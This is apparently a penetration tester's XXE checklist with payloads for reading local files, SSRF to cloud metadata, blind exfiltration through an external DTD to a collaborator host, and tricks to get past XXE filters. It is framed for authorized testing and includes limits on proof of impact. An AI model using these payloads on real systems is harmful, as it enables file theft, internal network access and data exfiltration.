# XML External Entity (XXE)

**What it is:** XML parser processes attacker-defined external entities → file read, SSRF, OOB exfil, sometimes RCE/DoS.

## Where to look
Any XML intake: SOAP APIs, SAML, `Content-Type: application/xml`, SVG upload, DOCX/XLSX/ODT (zipped XML), RSS, sitemap upload, config import. Also JSON endpoints that accept XML if you switch content-type.

## Payloads
```xml
Classic file read:
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>

SSRF:
<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">

Blind OOB (external DTD):
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://collab/evil.dtd"> %p;]>
```
`evil.dtd`:
```xml
<!ENTITY % f SYSTEM "file:///etc/passwd">
<!ENTITY % w "<!ENTITY &#x25; e SYSTEM 'http://collab/?d=%f;'>">
%w; %e;
```

## Variants
- [ ] Parameter entities when general entities are filtered.
- [ ] Error-based exfil (leak file in a parser error message).
- [ ] SVG/image upload XXE. XInclude when you only control part of the doc.
- [ ] Billion-laughs / quadratic blowup = DoS (do **not** run on live targets).

## Impact
Local file read (secrets, source), SSRF → cloud metadata, internal port scan.

## Tools
Burp, `XXEinjector`, Collaborator for OOB.

## 🎯 PoC — Request → Response

**Classic file read on an XML intake endpoint:**
```http
POST /api/v1/import HTTP/2
Host: target.com
Authorization: Bearer <mine>
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root><name>&xxe;</name></root>
```
```http
HTTP/2 200 OK
Content-Type: application/json

{"imported":false,"error":"unknown record 'web-prod-03'"}   ← file content reflected in error
```
`web-prod-03` = contents of `/etc/hostname` echoed back = XXE file read. Escalate to blind OOB via external DTD if not reflected (payload in file body).

## Deep cuts — reach parsers that "block" XXE
- [ ] **Content-type pivot:** a JSON endpoint often has an XML code path — resend as `application/xml`, `text/xml`, `application/soap+xml`, or `*/*` and watch for a different parser.
- [ ] **Office/zip formats:** DOCX/XLSX/PPTX/ODT are zipped XML. Inject the entity into `word/document.xml` (or `[Content_Types].xml`), re-zip, upload to a doc processor/preview/converter.
- [ ] **SVG upload → SSRF/file-read:** `<svg><image href="file:///etc/passwd">` / DTD in an uploaded SVG rendered server-side (thumbnailer, avatar) — chains to cloud-metadata SSRF (`06-file-upload/02`, `03-injection/06`).
- [ ] **XInclude (only control a fragment):** when you can't add a DOCTYPE, `<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></x>`.
- [ ] **Error-based when OOB egress is blocked:** trigger a parser error that embeds the file contents (nonexistent local DTD trick, or `%f;` inside an invalid entity) → data in the error message.
- [ ] **Local-DTD reuse (fully offline OOB):** reference an on-disk DTD (`/usr/share/xml/…`, `docbook`, JDK `.dtd`) and redefine one of its entities to leak a file — works when external HTTP fetch is disabled but local files load.
- [ ] **Encoding bypass:** re-encode the payload UTF-16/UTF-7/EBCDIC or add a BOM when a naive filter greps for `<!DOCTYPE`/`<!ENTITY` in ASCII.
- [ ] **Keyword-filter dodge:** when the filter greps the literal `ENTITY`/`DOCTYPE` string — case-vary (`<!eNtItY>`), split it across an XML comment, or use a `PUBLIC` identifier instead of `SYSTEM`; `data:text/plain;base64,...` wraps the payload past URL-scheme blocklists.
- [ ] **Protocol reach (per stack):** `file:` `http:` `ftp:` everywhere; PHP `php://filter/convert.base64-encode/resource=` (read source), `expect://`, `phar://`; Java `jar:`, `netdoc:`, `gopher:` (via redirect).
- [ ] **SOAP/SAML XML:** the assertion/body is attacker XML — test XXE there (`04-auth-session/10-saml`, `07-api/01`).
- [ ] **DoS (report-only, don't fire on prod):** billion-laughs / quadratic-blowup / external-entity-in-a-loop — note the vector, don't execute.

## Report notes
Read a benign file (`/etc/hostname`) or hit Collaborator to prove. No metadata-credential theft beyond proof. State the parser/format and whether it was in-band, error-based, or OOB.
